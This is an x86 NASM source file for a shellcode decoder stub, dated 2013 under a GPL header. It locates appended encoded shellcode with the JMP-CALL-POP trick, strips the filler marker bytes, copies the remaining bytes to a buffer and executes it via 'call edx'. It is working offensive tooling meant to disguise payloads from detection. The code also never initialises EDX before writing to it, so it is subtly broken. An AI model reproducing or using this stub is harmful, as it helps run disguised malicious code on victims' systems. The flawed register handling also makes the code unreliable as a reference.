;    This program is free software: you can redistribute it and/or modify
;    it under the terms of the GNU General Public License as published by
;    the Free Software Foundation, either version 3 of the License, or
;    (at your option) any later version.
;
;    This program is distributed in the hope that it will be useful,
;    but WITHOUT ANY WARRANTY; without even the implied warranty of
;    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;    GNU General Public License for more details.
;
;    You should have received a copy of the GNU General Public License
;    along with this program.  If not, see <http://www.gnu.org/licenses/>.
;
;
; Filename: decoder.nasm
; Author: Andrey Arapov <andrey.arapov@gmail.com>
; 2013 April
;
;

section .text
global _start

_start:
	jmp short _down		; JMP-CALL-POP technique
_up:
	pop esi			; get the last address of this program, 
				; which will be a start of our encoded shellcode

	xor ecx, ecx		; zero the counter, will be used below

_decoder:
	mov al, byte [esi]	; preparing to compare the first byte of the encoded shellcode
	inc esi			; going for the next byte

	;
	; Checking for markers
	;
	cmp al, 0x37
	je short _decoder	; if current byte is a gargabe, then we skip it and check the next byte

	cmp al, 0xFA
	je short _decoder	; if current byte is a gargabe, then we skip it and check the next byte

	cmp al, 0xD6
	je short _decoder	; if current byte is a gargabe, then we skip it and check the next byte

	cmp al, 0x3F
	je short _decoder	; if current byte is a gargabe, then we skip it and check the next byte

	cmp al, 0xAF
	je short _runshellcode	; if we reach the exit marker, then we run the shellcode

	;
	; Collecting decoded shellcode in the EDX address
	;
	mov byte [edx+ecx], al	; moving good byte to EDX
	inc ecx			; increase the counter

	jmp short _decoder	; continuing


_runshellcode:
	call edx

_down:
	call _up		; ESP now has and address that points to the next instruction, however we are going UP
